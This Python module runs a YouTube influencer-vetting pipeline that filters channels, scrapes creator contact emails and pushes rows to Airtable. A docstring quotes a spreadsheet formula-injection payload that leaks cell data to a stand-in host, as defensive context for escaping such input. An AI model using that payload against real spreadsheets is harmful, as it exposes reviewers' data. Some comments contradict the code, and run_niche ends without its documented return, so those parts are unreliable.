"""
Orchestrates the full channel vetting pipeline, per niche:

  run_discovery() -> pre-filter against that niche's existing Airtable
  channel IDs -> for each remaining candidate: enrich -> score -> push
  to that niche's Airtable table

Run with --test to sanity-check the whole pipeline cheaply (1 keyword,
5 results, first niche only) before spending real quota on a full run.
"""
import argparse
import logging
import sys
import time

# Channel titles can contain characters outside Windows' default console
# codepage (cp1252) — without this, printing one crashes the whole run
# partway through with UnicodeEncodeError.
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

from discovery import run_discovery
from enrichment import (
    get_channel_stats,
    get_recent_video_performance,
    calc_upload_frequency,
    channel_age_months,
    scan_older_videos_for_email,
    count_longform_in_older_videos,
)
from scoring import calc_fake_follower_risk, calc_overall_score, QUALIFIED, qualify
from search_zones import country_code, region_from_language_tag, zone_verdict
from airtable_client import (
    get_existing_channel_ids,
    push_record,
    AirtableReadError,
    count_added_today,
)
from external_dedupe import fetch_external_handles
from prospect_day import today_iso
from quota_tracker import get_today_spend
from browser_email import BrowserEmailScraper, null_scraper
from do_not_contact import BlocklistUnavailable, fetch_blocklist
from config import (
    API_SLEEP_SECONDS,
    DEFAULT_STATUS,
    SOURCE_LABEL,
    DAILY_QUOTA_BUDGET,
    AIRTABLE_TABLE_HOME_THEATER,
    AIRTABLE_TABLE_LIFESTYLE_SOFA,
    CANDIDATE_OVERSHOOT,
    DAILY_FLAGGED_CAP,
    DAILY_QUALIFIED_CAP,
    DISCOVERY_DAYS_BACK,
    EXPECTED_CANDIDATES_PER_KEYWORD,
    USE_PLAYWRIGHT_STEALTH,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

# One entry per niche: its search keywords (drawn directly from the
# "Types of Content Posting" > Primary section of each influencer
# profiling brief, Cynthia Lim, updated 15 April 2024 — i.e. actual video
# topics target creators publish, not demographic/psychographic traits,
# those aren't searchable YouTube content) and which Airtable table its
# discovered channels get pushed to. Re-tune keywords as new briefs come
# in or results drift off-niche.
NICHES = {
    "Home Theater": {
        "keywords": [
            "home theater products review",
            "man cave tour",
            "entertainment room makeover",
            "car and truck review",
            "power tools review",
            "sports podcast commentary",
            "movie review and reaction",
            "home theater tech setup",
            "homesteading vlog",
        ],
        "table_name": AIRTABLE_TABLE_HOME_THEATER,
        # From the Home Theater brief (Cynthia Lim, 15 April 2024):
        # "Has a Min 10k+ views on YouTube" and "Not a new channel".
        # The 10,000 figure is now the floor BOTH niches run on, so this
        # entry is unchanged by the 2026-08 criteria change — it is the one
        # the other niche moved to. The threshold stays per-niche rather
        # than becoming a shared constant so a niche can be given its own
        # bar again without unpicking the gate.
        "min_avg_views": 10_000,
        "min_channel_age_months": 12,
    },
    "Lifestyle Sofa": {
        "keywords": [
            "interior design and styling",
            "home decor tour",
            "DIY home makeover",
            "day in the life stay at home mom",
            "home cleaning and organizing",
            "furniture review unboxing",
            "cozy living room decor",
            "country living home",
            "minimalist home living",
            "house tour apartment tour",
            "seasonal home decor",
        ],
        "table_name": AIRTABLE_TABLE_LIFESTYLE_SOFA,
        # RAISED from the brief's 2,000 to 10,000 in the 2026-08 criteria
        # change, which put both niches on the same view floor. The brief
        # (Cynthia Lim, 15 April 2024) says "Has min of 2k+ view on YouTube
        # videos" — this deliberately overrides it, so don't "restore" the
        # 2,000 from the brief without checking that the instruction to
        # unify the two niches has actually been reversed.
        #
        # The brief sets no channel-age requirement, and that part still
        # stands. Its Instagram thresholds (100k+ followers, 20k+ reel
        # views) are out of scope — this pipeline only observes YouTube.
        "min_avg_views": 10_000,
        "min_channel_age_months": None,
    },
}

# Niche match currently defaults to a neutral midpoint (50/100) since
# automated topical matching isn't implemented yet — human reviewers can
# override the "Overall Score" judgment during Airtable review. Wire in a
# real niche classifier here if/when one becomes available.
DEFAULT_NICHE_MATCH = 70.0


# One label per step of the chain below. backfill_missing_emails.py
# aggregates these to report which step actually moved email coverage,
# so they must stay distinct.
EMAIL_SOURCE_REPEATED = "repeated across recent videos"
EMAIL_SOURCE_ABOUT = "About description"
EMAIL_SOURCE_OLDER = "repeated across older videos"
EMAIL_SOURCE_BROWSER = "linked site or its /contact page (Playwright)"


# --- Pre-push gate -------------------------------------------------------
# The ONE place this pipeline discards a candidate outright instead of
# flagging it for review. Everything else follows the flag-never-discard
# rule; these cases are exceptions because a human reviewing them is pure
# cost.
#
# The 2026-08 criteria change moved the view floor in here. It used to
# produce a "Below View Minimum" row for a reviewer to dismiss; it is now
# a hard requirement, so an under-view channel is discarded and that
# Qualification value no longer exists (see scoring.py). Two more hard
# requirements landed with it: a minimum video count, and the search-zone
# check below.
#
# Dead channels: both measures have to be dead, not either. In the live
# Home Theater table five rows were burning flagged budget at 0-281 subs
# and 0-38 avg views, while the lowest legitimate Qualified channel sat at
# 2,400 subs / 16,160 views — so 100/100 clears the junk with two orders of
# magnitude to spare. Requiring BOTH keeps a small-but-growing channel
# (few subs, real views) and a fading big one (many subs, few views) in the
# table where a reviewer can see them.
#
# That gate is now mostly redundant against a 10,000-view floor, and is
# kept anyway: it is the floor that holds if a niche's own min_avg_views is
# ever lowered, and it is the only one of the two that reads subscribers.
JUNK_MIN_SUBSCRIBERS = 100
JUNK_MIN_AVG_VIEWS = 100

# A published track record, applied to BOTH niches. Read from
# channels.list statistics.videoCount, i.e. the channel's whole public
# catalogue, not the 10-video performance window or the 50-video email
# scan. Deliberately a FLOOR with no upper bound: "30-40 videos" describes
# the smallest catalogue worth approaching, and a channel with 400 uploads
# clears that bar rather than failing it.
MIN_VIDEO_COUNT = 30

# The same 30-video floor, but counting only videos confirmed NOT to be
# Shorts. MIN_VIDEO_COUNT above reads statistics.videoCount, which lumps
# Shorts in with everything else — so a channel with 300 Shorts and 4
# long-form uploads cleared it, which is not what "30-40 videos minimum"
# means for a brand looking to place a product in real content.
#
# is_shorts_only() does NOT cover this: it discards only channels that are
# 100% Shorts, so the entire middle ground (a Shorts factory that posts the
# occasional long-form video) passed both checks. Measured on 47 otherwise-
# qualifying Home Theater candidates, 12 had fewer than 10 long-form videos
# in their newest 50 and were being written as prospects.
#
# Confirmed against up to ~200 videos — the newest 50 from enrichment plus
# LONGFORM_SCAN_MAX_PAGES more — see enrichment.count_longform_in_older_videos.
MIN_LONGFORM_VIDEO_COUNT = 30

# Content language must be English. The tag is the channel's own
# defaultAudioLanguage/defaultLanguage, reduced to the most common value
# across the sampled videos by enrichment.dominant_language().
#
# Matched on the "en" PREFIX, so en, en-US, en-GB and en-AU all pass: the
# region subtag is not noise to be normalised away — main.resolve_country()
# reads it to place channels that declare no country, which is the only
# search-zone signal available for ~15% of candidates. Stripping it to a bare
# "en" would silently blind the zone filter for exactly those channels.
ENGLISH_LANGUAGE_PREFIX = "en"

DROP_DEAD_CHANNEL = "dead_channel"
DROP_SHORTS_ONLY = "shorts_only"
DROP_BELOW_VIEW_MINIMUM = "below_view_minimum"
DROP_TOO_FEW_VIDEOS = "too_few_videos"
DROP_TOO_FEW_LONGFORM = "too_few_longform_videos"
DROP_NOT_ENGLISH = "not_english"
DROP_OUTSIDE_SEARCH_ZONE = "outside_search_zone"


def is_english(content_language: str | None) -> bool:
    """
    Whether a content-language tag is English.

    An UNSET tag is not English here — a deliberate break from this
    pipeline's usual "absent data never disqualifies" rule (unknown channel
    age, unknown country). The requirement is that every row's Content
    Language reads as English, and a blank cannot satisfy it; keeping unsets
    would put "Unknown" rows in a table specified to hold English channels.

    The cost of the strict reading was measured before choosing it: across
    197 enriched candidates, ZERO of the 47 that passed every other gate had
    an unset language, because dominant_language() reads the whole 50-video
    window rather than one video. So this discards essentially nothing today
    — but it is the strict direction, and if a future sample does carry
    unsets they will be dropped rather than written as Unknown.
    """
    return (content_language or "").strip().lower().startswith(ENGLISH_LANGUAGE_PREFIX)


def pre_push_drop_reason(
    subscriber_count: int | None,
    avg_views: float | None,
    shorts_only: bool = False,
    min_avg_views: float = 0,
    video_count: int | None = None,
    content_language: str | None = None,
) -> str | None:
    """
    Why this candidate should never reach Airtable, or None to continue.

    Applies regardless of what qualify() would have returned — a row for a
    dead channel is exactly the row this gate exists to stop writing.

    Deliberately does NOT cover the search zone, nor the long-form video
    floor. Both need data this function can't get for free — a country
    (see resolve_country) and up to three extra pages of uploads (see
    longform_drop_reason) — so they run as their own steps in
    process_candidate, AFTER everything here. Everything in this function is
    answerable from data already fetched, which is what makes it the cheapest
    place to discard.

    Unknown data never disqualifies, the same rule qualify() follows: a
    `video_count` of None means channels.list didn't report one, and an
    unreported catalogue size is not evidence of a small catalogue. A
    reported 0 is a real answer and is failed like any other number below
    the floor. The ONE exception is `content_language` — see is_english() for
    why an unset language is treated as a failure there.

    `content_language` defaults to None, which fails the English check. That
    default is deliberate: a caller that forgets to pass it gets a loud
    empty result rather than silently skipping the gate.
    """
    if shorts_only:
        return DROP_SHORTS_ONLY
    if not is_english(content_language):
        return DROP_NOT_ENGLISH
    if video_count is not None and video_count < MIN_VIDEO_COUNT:
        return DROP_TOO_FEW_VIDEOS
    if (avg_views or 0) < min_avg_views:
        return DROP_BELOW_VIEW_MINIMUM
    if (subscriber_count or 0) < JUNK_MIN_SUBSCRIBERS and (avg_views or 0) < JUNK_MIN_AVG_VIEWS:
        return DROP_DEAD_CHANNEL
    return None


def longform_drop_reason(longform_count: int) -> str | None:
    """
    Whether the channel showed MIN_LONGFORM_VIDEO_COUNT confirmed non-Shorts
    uploads, or None to continue.

    Split out from pre_push_drop_reason because establishing the count can
    cost quota (see enrichment.count_longform_in_older_videos), so it must
    run after every free check has had its chance to discard the candidate.

    Unlike `video_count`, a shortfall here IS a failure even though the data
    is partial. That is the point: a channel gets ~200 videos' worth of
    chances to show 30 long-form uploads, and not showing them is the
    evidence, not missing data.
    """
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        return DROP_TOO_FEW_LONGFORM
    return None


def resolve_country(stats: dict, performance: dict) -> str:
    """
    Where the channel says it is, or "" when it says nothing.

      1. `channels.list` -> snippet.country, an ISO 3166-1 alpha-2 code.
         85% of the channels in the live tables set it (29 of 34).
      2. The REGION SUBTAG of the content language ("en-GB" -> GB), for
         the rest. Free — `get_recent_video_performance()` already read
         `defaultAudioLanguage` for the "Content Language" column.

    Both steps are free, so this can run for every surviving candidate.

    Step 2 is a weak signal used only where step 1 is silent, never to
    override it: measured on the live tables the language tag disagrees
    with the declared country for 4 of the 29 channels that have one
    (`en-US` content from India, Austria and Serbia; `fr-FR` from the US).
    A bare language with no region subtag yields nothing at all — see
    search_zones.region_from_language_tag.

    There is deliberately no browser step here. See browser_email.py: the
    About panel's country is the same field as snippet.country, so it
    recovered 0 of the 5 live channels that lack one.
    """
    country = (stats.get("country") or "").strip()
    if country_code(country):
        return country

    return region_from_language_tag(performance.get("content_language"))


def resolve_email_with_source(stats: dict, performance: dict, scraper=None) -> tuple[str, str]:
    """
    Email fallback chain, cheapest and strongest signal first, returning
    (email, source_label) — or ("", "") when no step found anything:

      1. An address repeated across several recent video descriptions.
      2. A single mention in the channel's own About description.
      3. The same repeat test, extended over OLDER uploads.
      4. The channel's public external link list, followed in Playwright:
         each non-third-party link, then its /contact page.

    Steps 1-2 use data already fetched during enrichment and cost
    nothing. Step 3 costs 2 quota units per extra page and only runs when
    1-2 found nothing, so channels whose address is already known never
    trigger it. Step 4 is last because a browser session is the slowest
    and least reliable option, not because it's the strongest signal.

    Step 4 reads the LINK LIST, not the About text — step 2 already has
    the full About description from channels.list, so re-reading it in a
    browser could never add an address. See browser_email.py.

    Reporting the source here is what lets callers attribute a hit to a
    step. Comparing the result back against stats/performance can't: two
    of the four steps (3 and 4) are indistinguishable that way.
    """
    email = performance.get("repeated_email")
    if email:
        return email, EMAIL_SOURCE_REPEATED

    email = stats.get("business_email", "")
    if email:
        return email, EMAIL_SOURCE_ABOUT

    email = scan_older_videos_for_email(
        stats["channel_id"],
        stats.get("uploads_playlist_id", ""),
        performance.get("next_page_token", ""),
        performance.get("video_descriptions", []),
    )
    if email:
        return email, EMAIL_SOURCE_OLDER

    if scraper is not None:
        email = scraper.find_email(stats["channel_id"])
        if email:
            return email, EMAIL_SOURCE_BROWSER

    return "", ""


def resolve_email(stats: dict, performance: dict, scraper=None) -> str:
    """The chain above, for callers that only need the address itself."""
    return resolve_email_with_source(stats, performance, scraper)[0]


def push_until_full(
    candidates: list[dict],
    build_record,
    table_name: str,
    qualified_headroom: int,
    flagged_headroom: int = 0,
) -> dict:
    """
    Push candidates until both daily budgets are exhausted or the
    candidates run out.

    `build_record(candidate)` returns `(record, qualification)`, or
    `(None, reason)` to skip the candidate without spending budget.

    Only SUCCESSFUL pushes consume budget. The previous loop counted
    attempts, so a run of Airtable failures would have burned the day's
    allowance without writing anything.

    Returns counts plus "pushed_ids", the Channel IDs actually written —
    matching the original loop, which added to newly_tracked_ids only
    when push_record returned True.
    """
    counts = {"qualified": 0, "flagged": 0, "skipped": 0, "pushed_ids": set()}

    for candidate in candidates:
        if counts["qualified"] >= qualified_headroom and counts["flagged"] >= flagged_headroom:
            logger.info("Both daily budgets are full — stopping this niche.")
            break

        record, qualification = build_record(candidate)
        if record is None:
            counts["skipped"] += 1
            continue

        bucket = "qualified" if qualification == QUALIFIED else "flagged"
        headroom = qualified_headroom if bucket == "qualified" else flagged_headroom
        if counts[bucket] >= headroom:
            counts["skipped"] += 1
            continue

        if push_record(table_name, record):
            counts[bucket] += 1
            counts["pushed_ids"].add(record["Channel ID"])
        # A failed push is logged inside push_record and costs no budget.

    return counts


# --- Spreadsheet safety for reviewer-facing text -------------------------
# Characters that make a spreadsheet treat a cell's contents as a FORMULA
# rather than as text. The tab and CR are in here because a leading
# whitespace character is stripped by some importers before the formula
# check runs, which puts the "=" back at the front.
SPREADSHEET_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str) -> str:
    """
    Neutralise a value that a spreadsheet would otherwise run as a formula.

    WHY this exists at all — it looks like a pointless prefix until you
    follow the value to where a human actually reads it:

      - Airtable is NOT a formula-eval context for these values, so nothing
        executes when the record is pushed. That is why this is easy to
        mistake for dead code and "clean up". Don't.
      - But this pipeline's entire purpose is to hand rows to a HUMAN
        reviewer, and the normal thing a reviewer does with an Airtable view
        is export it to CSV and open it in Excel or Google Sheets. THAT is a
        formula-eval context: a cell starting with =, +, -, @ or a leading
        tab/CR is parsed as a formula, not as text.
      - Two of the fields we write are attacker-influenced. "Channel Name"
        is whatever the channel owner typed, and "Email" can come out of
        browser_email.py, which reads arbitrary third-party websites. A
        channel named `=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes
        a live payload in the reviewer's spreadsheet — classic CSV (formula)
        injection, and the reviewer's machine is the target, not ours.

    A leading apostrophe is the fix because it is what spreadsheets
    themselves use to mean "this cell is literal text": Excel and Sheets
    both consume it on import and display the original string.

    Deliberately conservative about what it touches:

      - Only the FIRST character is examined. "Bob's Home Theater" and
        `a-b@c.com` contain dangerous characters but cannot start a formula,
        and mangling ordinary channel names/addresses would make the field
        wrong for every honest candidate to defend against a rare one.
      - Non-strings (and empty strings/None) pass straight through with
        their type intact. Several record fields are genuinely numeric and
        Airtable's Number fields reject strings, so stringifying here would
        break the push for every record.
    """
    if not isinstance(value, str) or not value:
        return value
    if value[0] in SPREADSHEET_FORMULA_PREFIXES:
        return "'" + value
    return value


def process_candidate(
    candidate: dict,
    external_handles: dict[str, str],
    blocklist,
    niche_config: dict,
    scraper,
) -> tuple[dict | None, str]:
    """Enrich, screen, qualify, and build an Airtable record for one candidate."""
    channel_id = candidate["channel_id"]

    # Checkpoint 1 — free, before spending ~3 quota units on enrichment.
    hit = blocklist.match(name=candidate.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED (pre-enrichment) %s — DO NOT CONTACT (%s).", candidate.get("channel_title"), hit)
        return None, "blocked"

    stats = get_channel_stats(channel_id)
    time.sleep(API_SLEEP_SECONDS)
    if stats is None:
        return None, "unreachable"

    # Checkpoint 2 — the reliable key, known only after channels.list.
    hit = blocklist.match(handle=stats.get("handle", ""), name=stats.get("channel_title", ""))
    if hit:
        logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
        return None, "blocked"

    # Skip channels already tracked in the base's other YouTube outreach/
    # leads/influencer tables (see external_dedupe.py) — checked here
    # rather than pre-discovery, since we only know a candidate's @handle
    # once channels.list has already run.
    handle = stats.get("handle", "")
    if handle and handle in external_handles:
        logger.info(
            "Skipping %s — already tracked in '%s' (@%s).",
            stats.get("channel_title"), external_handles[handle], handle,
        )
        return None, "duplicate"

    performance = get_recent_video_performance(channel_id, stats.get("uploads_playlist_id"))
    time.sleep(API_SLEEP_SECONDS)
    if performance is None:
        logger.info("Skipping %s — no accessible recent video performance data.", stats.get("channel_title"))
        return None, "unreachable"

    # Pre-push gate, placed before scoring and before the email chain so a
    # discarded candidate costs no browser session and no deep-scan quota.
    drop_reason = pre_push_drop_reason(
        stats.get("subscriber_count"),
        performance.get("avg_views"),
        performance.get("shorts_only", False),
        min_avg_views=niche_config["min_avg_views"],
        video_count=stats.get("video_count"),
        content_language=performance.get("content_language"),
    )
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%s subs, %s avg views, %s videos, lang %s).",
            stats.get("channel_title"), drop_reason,
            stats.get("subscriber_count"), round(performance.get("avg_views") or 0, 1),
            stats.get("video_count"), performance.get("content_language") or "unset",
        )
        return None, drop_reason

    # Search zone. Free — both of resolve_country's sources come out of
    # data already fetched, so this costs no extra call and no page load.
    #
    # A None verdict means the channel declares no country we can read, and
    # is deliberately KEPT — absent data is not evidence against a channel,
    # the same rule qualify() applies to an unknown channel age. Only a
    # positively-outside country is discarded.
    country = resolve_country(stats, performance)
    if zone_verdict(country) is False:
        logger.info(
            "Dropping %s before push — %s (country: %s).",
            stats.get("channel_title"), DROP_OUTSIDE_SEARCH_ZONE, country,
        )
        return None, DROP_OUTSIDE_SEARCH_ZONE

    # Long-form floor, LAST of the discard gates because it is the only one
    # that can cost quota: confirming 30 non-Shorts uploads may need up to
    # LONGFORM_SCAN_MAX_PAGES extra pages (2 units each) for a channel whose
    # newest 50 videos didn't already show them. Every free reason to discard
    # has now had its turn, so nothing is paged for a candidate that was
    # going to be dropped anyway.
    longform_count = performance.get("longform_count", 0)
    if longform_count < MIN_LONGFORM_VIDEO_COUNT:
        longform_count = count_longform_in_older_videos(
            channel_id,
            stats.get("uploads_playlist_id", ""),
            performance.get("next_page_token", ""),
            already_counted=longform_count,
            target=MIN_LONGFORM_VIDEO_COUNT,
        )
    drop_reason = longform_drop_reason(longform_count)
    if drop_reason:
        logger.info(
            "Dropping %s before push — %s (%d confirmed non-Shorts of %s total videos).",
            stats.get("channel_title"), drop_reason, longform_count, stats.get("video_count"),
        )
        return None, drop_reason

    upload_freq = calc_upload_frequency(performance["upload_dates"])
    fake_risk = calc_fake_follower_risk(
        stats["subscriber_count"], performance["avg_views"], performance["avg_engagement_rate"]
    )
    overall_score = calc_overall_score(
        stats["subscriber_count"],
        performance["avg_views"],
        performance["avg_engagement_rate"],
        upload_freq,
        fake_risk,
        DEFAULT_NICHE_MATCH,
    )

    # Age is the only qualification question left — the view floor, the
    # video-count floor and the search zone are all hard gates above, so a
    # candidate that reaches here has already passed them.
    qualification = qualify(
        channel_age_months(stats.get("published_at", "")),
        niche_config["min_channel_age_months"],
    )

    email = resolve_email(stats, performance, scraper)

    # Checkpoint 3 — catches agency addresses shared across channels.
    if email:
        hit = blocklist.match(email=email)
        if hit:
            logger.info("BLOCKED %s — DO NOT CONTACT (%s).", stats.get("channel_title"), hit)
            return None, "blocked"

    # csv_safe() is applied to the FREE-TEXT fields only — see its docstring
    # for why (the reviewer exports this view to CSV and opens it in Excel).
    # Which fields are excluded, and why, matters as much as which are
    # wrapped; each exclusion is noted at its line below.
    record = {
        # Attacker-controlled: whatever the channel owner typed.
        "Channel Name": csv_safe(stats["channel_title"]),
        # NOT wrapped: "Channel URL" and "Channel ID" are matched on EXACTLY
        # elsewhere. Channel ID in particular is the dedupe key
        # airtable_client.channel_exists() looks up by, so a leading
        # apostrophe would make every existing row invisible to the lookup
        # and the pipeline would re-POST duplicates instead of PATCHing.
        # Neither field can carry a payload anyway: both are derived from a
        # YouTube channel ID, which is a fixed-alphabet "UC..." string.
        "Channel URL": f"https://www.youtube.com/channel/{channel_id}",
        "Channel ID": channel_id,
        # NOT wrapped: numeric fields. Airtable's Number fields reject
        # strings, and csv_safe() passes non-strings through untouched
        # precisely so that a mistake here fails loudly rather than being
        # papered over.
        "Subscriber Count": stats["subscriber_count"],
        "Avg Views (last 10 videos)": round(performance["avg_views"], 1),
        "Engagement Rate": round(performance["avg_engagement_rate"], 2),
        # "Upload Frequency" is a text field in Airtable (not Number) — it
        # rejects raw JSON numbers, so this must be sent as a string.
        # Rounded to a whole number for display; the unrounded value is
        # still what feeds calc_overall_score above.
        #
        # NOT wrapped: this string is built here and always starts with a
        # digit, so csv_safe() would be a guaranteed no-op. Harmless either
        # way; left off so the wrapped fields are exactly the ones carrying
        # third-party text.
        "Upload Frequency": f"{round(upload_freq)} videos/month",
        # Best-effort: most creators never set defaultAudioLanguage/
        # defaultLanguage on their videos, so this is frequently "Unknown".
        # Channel *country* (stats["country"]) is a separate signal and is
        # deliberately not used here, since it isn't the same thing as the
        # content's spoken language.
        #
        # Wrapped: it's a free-text field echoing a value the channel owner
        # set on their videos.
        "Content Language": csv_safe(performance.get("content_language") or "Unknown"),
        # Attacker-influenced: chain step 4 (browser_email.py) reads
        # arbitrary third-party websites for this.
        "Email": csv_safe(email),
        "Fake Follower Risk Score": fake_risk,
        "Overall Score": overall_score,
        # NOT wrapped: Single Select values that must match an existing
        # Airtable option EXACTLY. push_record sends typecast=True, which
        # silently CREATES a missing option rather than erroring — so a
        # mangled "'Qualified" would quietly mint a new option and drop the
        # row out of the reviewer's saved views. Both values are ours
        # (scoring.py / config.py), not third-party text.
        "Qualification": qualification,
        "Status": DEFAULT_STATUS,
        # Wrapped for consistency rather than out of fear: the keywords are
        # our own NICHES entries, so the risk is low, but it is still a text
        # field assembled from data and there is no reason to leave the one
        # free-text field uncovered.
        "Source": csv_safe(f"{SOURCE_LABEL} ({', '.join(candidate.get('matched_keywords', []))})"),
        "Notes": "",
        # NOT wrapped: a date value from prospect_day.today_iso(), not text.
        "Date Added": today_iso(),
    }
    return record, qualification


def run_niche(
    niche_name: str,
    table_name: str,
    keywords: list[str],
    max_results_per_keyword: int,
    days_back: int,
    globally_tracked_ids: set[str],
    external_handles: dict[str, str],
    blocklist,
    niche_config: dict,
    scraper,
) -> tuple[int, int, set[str], bool]:
    """
    Run discovery -> pre-filter -> enrich -> score -> push for one niche's
    table. `globally_tracked_ids` is the base-wide dedupe set (union of
    every niche table's Channel IDs, not just this one) — a candidate
    already tracked in ANY niche's table is skipped here too, so a
    channel is claimed by whichever niche discovers it first rather than
    being trackable in more than one table.

    Returns (discovered_count, processed_count, newly_tracked_ids,
    cap_check_completed) — the caller merges newly_tracked_ids into the
    shared dedupe set so a later niche in the same run also sees channels
    just pushed by this one.

    cap_check_completed is True iff this niche's daily-cap check
    (count_added_today) actually ran and succeeded — regardless of
    whether it turned out the niche was already at cap. It is False when
    the niche was skipped for a reason that says nothing about today's
    cap (no table configured, a misconfigured NICHES entry, or an
    unreadable Airtable count). run() uses this to tell "every niche is
    legitimately full today" (a real no-op) apart from "nothing could be
    checked" (a run that silently did nothing) — see IMPORTANT 3 in the
    fix-wave review.
    """
    if not table_name:
        logger.error(
            "No Airtable table configured for niche '%s' — set the matching env var. Skipping this niche.",
            niche_name,
        )
        return 0, 0, set(), False

    # Read the niche's qualification criteria ONCE, here, rather than
    # indexing niche_config[...] inside process_candidate (which runs
    # once per candidate). Checked with "in" rather than truthiness:
    # min_channel_age_months legitimately holds None for niches with no
    # age requirement (e.g. Lifestyle Sofa), so its presence — not its
    # value — is what a misconfigured NICHES entry would get wrong.
    # Failing fast here means a bad config skips this niche instead of
    # raising a KeyError mid-niche and killing the whole run.
    if "min_avg_views" not in niche_config or "min_channel_age_months" not in niche_config:
        logger.error(
            "Niche '%s' is missing 'min_avg_views' or 'min_channel_age_months' in its NICHES "
            "config — skipping this niche rather than crashing partway through.",
            niche_name,
        )
        return 0, 0, set(), False

    logger.info("=== Niche: %s (table: %s) ===", niche_name, table_name)

    try:
        qualified_today = count_added_today(table_name, QUALIFIED)
        flagged_today = count_added_today(table_name) - qualified_today
    except AirtableReadError as e:
        logger.error("Cannot read today's counts for '%s' (%s) — skipping niche.", niche_name, e)
        return 0, 0, set(), False

    qualified_headroom = max(0, DAILY_QUALIFIED_CAP - qualified_today)
    flagged_headroom = max(0, DAILY_FLAGGED_CAP - flagged_today)
    logger.info(
        "'%s': %d/%d qualified and %d/%d flagged already added today.",
        niche_name, qualified_today, DAILY_QUALIFIED_CAP, flagged_today, DAILY_FLAGGED_CAP,
    )
    if qualified_headroom == 0 and flagged_headroom == 0:
        logger.info("'%s' is already at its daily cap — skipping (no quota spent).", niche_name)
        return 0, 0, set(), True

    # --- Refill loop --------------------------------------------------
    # Discover a batch of keywords, push what survives, and come back for
    # more while the QUALIFIED budget has room and keywords remain (see the
    # loop condition below for why flagged doesn't drive this).
    #
    # This used to be a single pass: discover
    # (headroom * CANDIDATE_OVERSHOOT) candidates once, push, done. That
    # worked while almost every candidate became a row, but the 2026-08
    # criteria change moved the view floor, the video-count floor and the
    # search zone into pre_push_drop_reason() as hard DISCARDS — measured,
    # only ~15% of fresh candidates now survive to be written (18 of 122 on
    # 2026-08-11). So a 40-row budget was handed 60 candidates, produced ~9
    # rows, and stopped with 6 of 9 keywords never searched. The cap was
    # unreachable by construction, and the only symptom was the
    # "finished under its qualified budget" warning below, which reads as
    # "discovery is running dry" — the wrong diagnosis, since the keywords
    # had plenty left.
    #
    # Refilling makes the loop self-correcting in both directions: a bad
    # survival rate keeps searching, and a good one stops early, so quota
    # still tracks what the day's headroom actually needs.
    pushed_qualified = 0
    pushed_flagged = 0
    total_discovered = 0
    total_skipped = 0
    pushed_ids: set[str] = set()

    # Local copy — the caller's set is shared across niches and must not be
    # mutated here. Grows with every candidate this niche has ALREADY
    # examined (pushed or dropped), so a later batch never re-enriches a
    # channel an earlier one already paid for.
    seen_ids = set(globally_tracked_ids)
    remaining_keywords = list(keywords)
    rounds = 0

    while remaining_keywords:
        # Only the QUALIFIED budget is worth spending another 100-unit
        # search on. The flagged budget is a CEILING, not a target — it
        # exists so a weak discovery day can't crowd the table with
        # below-criteria channels, so flagged rows are written
        # opportunistically as they turn up and never hunted for. Chasing it
        # would also never terminate for a niche that cannot produce one at
        # all: Lifestyle Sofa's min_channel_age_months is None, so qualify()
        # can only ever return "Qualified" there and its flagged budget goes
        # permanently unused (documented, expected). A loop that kept
        # searching until flagged filled would burn every keyword in that
        # niche, every day, for rows that can't exist.
        #
        # Tested after at least one round, so a niche whose qualified budget
        # is already full still gets a single opportunistic pass for flagged.
        if rounds and pushed_qualified >= qualified_headroom:
            break
        rounds += 1

        rows_wanted = (qualified_headroom - pushed_qualified) + (flagged_headroom - pushed_flagged)
        # How many keywords to search this round. Ceiling division, floor of
        # 1, so a small shortfall still searches one keyword rather than
        # zero (which would spin the loop without spending or progressing).
        wanted_candidates = max(1, int(rows_wanted * CANDIDATE_OVERSHOOT))
        batch_size = max(
            1,
            -(-wanted_candidates // max(1, EXPECTED_CANDIDATES_PER_KEYWORD)),
        )
        batch = remaining_keywords[:batch_size]
        remaining_keywords = remaining_keywords[batch_size:]

        logger.info(
            "Discovery round for '%s': %d keyword(s) %s — %d row(s) still wanted.",
            niche_name, len(batch), batch, rows_wanted,
        )
        # target_fresh is deliberately NOT passed: the batch was already
        # sized to the shortfall, and stopping part-way through it would
        # consume keywords from remaining_keywords without searching them.
        discovered = run_discovery(
            batch,
            max_results_per_keyword=max_results_per_keyword,
            days_back=days_back,
            exclude_ids=seen_ids,
        )
        total_discovered += len(discovered)
        logger.info("Discovered %d unique candidate channel(s).", len(discovered))

        # Straight set-membership filter, deliberately not a DataFrame: a
        # round trip through pandas rewrote the candidates on the way out —
        # it appended its own bookkeeping column to every record and filled a
        # NaN wherever one candidate carried a key another lacked (which also
        # promoted that column's ints to floats). Nothing downstream wanted
        # either.
        if not discovered:
            logger.info("No candidates discovered — nothing to process.")
        new_candidates = [c for c in discovered if c["channel_id"] not in seen_ids]

        logger.info(
            "%d candidate(s) already tracked or already examined, %d remaining to process.",
            len(discovered) - len(new_candidates), len(new_candidates),
        )

        counts = push_until_full(
            new_candidates,
            lambda c: process_candidate(c, external_handles, blocklist, niche_config, scraper),
            table_name,
            qualified_headroom - pushed_qualified,
            flagged_headroom - pushed_flagged,
        )

        pushed_qualified += counts["qualified"]
        pushed_flagged += counts["flagged"]
        total_skipped += counts["skipped"]
        pushed_ids |= counts["pushed_ids"]
        # Every candidate offered to push_until_full is now spent, whether it
        # was written or dropped. push_until_full only returns before reading
        # its whole list when BOTH budgets are full, which also ends this
        # loop — so nothing unexamined is being discarded here.
        seen_ids.update(c["channel_id"] for c in new_candidates)

        logger.info(
            "'%s' so far: %d/%d qualified, %d/%d flagged (%d keyword(s) left).",
            niche_name, pushed_qualified, qualified_headroom,
            pushed_flagged, flagged_headroom, len(remaining_keywords),
        )

    logger.info(
        "'%s': pushed %d qualified, %d flagged, skipped %d.",
        niche_name, pushed_qualified, pushed_flagged, total_skipped,
    )

    if pushed_qualified < qualified_headroom:
        logger.warning(
            "'%s' finished under its qualified budget (%d of %d) with every keyword "
            "searched. Discovery really is running dry for these keywords — widen "
            "--days-back for a one-off sweep, or add keywords from the brief's "
            "secondary content types.",
            niche_name, pushed_qualified, qualified_headroom,
        )

